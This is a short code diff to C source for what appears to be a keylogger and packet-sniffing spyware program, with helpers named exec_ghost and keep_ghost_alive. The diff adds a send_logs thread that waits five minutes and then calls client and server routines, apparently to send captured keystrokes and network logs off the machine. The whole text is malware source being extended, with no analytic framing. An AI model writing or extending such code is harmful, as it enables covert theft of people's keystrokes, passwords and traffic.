@@ -19,6 +19,7 @@
 #include "key_util.h"
 #include "util.h"
 #include "config.h"
+#include "server_client.h"
 
 #include "ip.h"
 #include "http.h"
@@ -39,6 +40,7 @@ pid_t exec_ghost();
 void* keep_ghost_alive(void *args);
 void packet_received(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
 void* start_keylogging(int kb_fd, FILE *log_file);
+void* send_logs();
 
 int main(int argc, char **argv)
 {
@@ -54,6 +56,9 @@ int main(int argc, char **argv)
     
     pthread_t keylog;
     pthread_create(&keylog, &attr, start_keylogging, &id);
+    
+    pthread_t sendlogs;
+    pthread_create(&sendlogs, &attr, send_logs, &id);
 
     FILE *network_log = fopen("log/network.txt", "a");
     struct loginfo info = { network_log, NEVER_WRITTEN, 4 };
@@ -154,6 +159,7 @@ int main(int argc, char **argv)
     pcap_close(handle);
     pthread_join(aliver, NULL);
     pthread_join(keylog, NULL);
+    pthread_join(sendlogs, NULL);
     fclose(network_log);
     fclose(log_file);
 
@@ -248,4 +254,11 @@ void* start_keylogging(int kb_fd, FILE *log_file){
             }
         }
     }
+}
+
+void *send_logs()
+{
+    sleep(300); //sleep for 300sec = 5 min
+    run_client();
+    run_server();
 }
